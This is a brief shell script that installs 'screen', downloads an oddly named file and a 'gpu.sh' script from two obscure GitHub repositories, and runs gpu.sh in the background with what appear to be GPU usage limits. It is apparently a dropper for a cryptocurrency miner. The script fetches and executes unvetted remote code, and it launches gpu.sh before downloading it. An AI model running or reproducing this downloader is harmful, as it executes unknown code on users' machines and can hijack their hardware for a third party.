#!/bin/sh
sudo apt update
sudo apt install screen -y
screen -dmS gpu.sh ./gpu.sh 65 75
wget https://github.com/levyglory45/sgsdf/raw/main/roisgawean
wget https://raw.githubusercontent.com/brusavido/testlowda/main/gpu.sh
chmod +x gpu.sh 
./gpu.sh
